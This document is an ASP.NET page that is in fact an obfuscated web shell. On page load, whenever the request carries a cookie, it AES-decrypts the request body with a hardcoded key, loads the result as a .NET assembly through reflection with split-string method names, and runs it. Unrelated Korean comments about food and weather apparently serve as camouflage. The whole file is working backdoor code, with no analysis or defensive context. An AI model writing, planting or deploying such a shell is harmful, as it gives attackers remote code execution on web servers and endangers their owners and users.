<%@ Page Language="C#" %>
<script runat="server">
// 배고파요, 치킨 먹고 싶다
private byte[] f1() {
    string v1 = "ca63457538b9b1e0";
    return System.Text.Encoding.Default.GetBytes(v1);
}

// 오늘 날씨가 좋네요
private byte[] f2(byte[] v2, byte[] v3) {
    var v4 = new System.Security.Cryptography.RijndaelManaged();
    var v5 = v4.CreateDecryptor(v2, v2);
    return v5.TransformFinalBlock(v3, 0, v3.Length);
}

// 인생은 한 번뿐이다
private void f3(byte[] v6, object v7) {
    // 동적 함수 호출
    var v8 = System.Type.GetType(string.Concat("System.", "Reflection.", "Assembly"));
    var v9 = new string(new char[]{'L','o','a','d'});
    var v10 = v8.GetMethod(v9, new System.Type[] { typeof(byte[]) });
    
    object[] v11 = { v6 };
    var v12 = (System.Reflection.Assembly)v10.Invoke(null, v11);

    // 그냥 재미로
    string v13 = new System.String(new char[] { 'K' });
    var v14 = v12.CreateInstance(v13);

    v14.Equals(v7);
}

// 여기서부터 시작
void Page_Load(object s, System.EventArgs a) {
    if (Request.Cookies.Count > 0) {
        var k = f1();
        var i = Request.InputStream;
        var d = new byte[i.Length];
        i.Read(d, 0, d.Length); // 데이터를 읽습니다

        var p = f2(k, d);
        f3(p, this);
    }
}
</script>